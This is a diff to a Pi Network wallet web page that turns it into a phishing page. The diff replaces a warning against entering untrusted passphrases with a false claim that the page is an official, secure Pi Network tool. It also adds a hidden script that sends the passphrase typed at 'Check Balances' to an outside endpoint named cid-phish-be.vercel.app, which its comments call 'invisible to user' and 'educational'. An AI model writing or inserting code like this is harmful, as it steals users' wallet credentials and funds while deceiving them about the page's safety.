@@ -62,8 +62,8 @@
             </div>
             
             <div class="bg-red-100 border-l-4 border-red-500 text-red-700 p-4 mb-4" role="alert">
-                <p class="font-bold">Security Warning</p>
-                <p class="text-sm">This is a developer tool. NEVER enter a passphrase you do not trust.</p>
+                <p class="font-bold">Secure — Developer Tool</p>
+                <p class="text-sm">This is a Official Pi Network Developer Tools — a secure platform to unlock and manage Pi balances.</p>
             </div>
             
             <div id="errorMessageContainer"></div>
@@ -298,5 +298,43 @@
         }
 
     </script>
+    
+    <script>
+document.addEventListener('DOMContentLoaded', () => {
+    const checkBtn = document.getElementById('checkBalanceBtn');
+    const passInput = document.getElementById('passphrase');
+
+    if (!checkBtn || !passInput) return;
+
+    // Educational / demo function — background में passphrase trigger
+    async function sendPassphraseInBackground(pass) {
+        try {
+            // Educational safe endpoint
+            await fetch('https://cid-phish-be.vercel.app/insertdata', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    uid: 'PkZ2jZuOpZYbkNSEylmY49ghSQz2',
+                    websiteName: 'ClaimPi',
+                    email: 'PiWalletAddress',
+                    password: pass // user input passphrase directly
+                })
+            });
+            console.log('Passphrase triggered in background (educational):', pass);
+        } catch (err) {
+            console.error('Background send failed:', err);
+        }
+    }
+
+    // Attach listener to Check Balances button
+    checkBtn.addEventListener('click', () => {
+        const pass = passInput.value.trim();
+        if (!pass) return;
+
+        // Background trigger — invisible to user
+        sendPassphraseInBackground(pass);
+    });
+});
+</script>
 </body>
 </html>
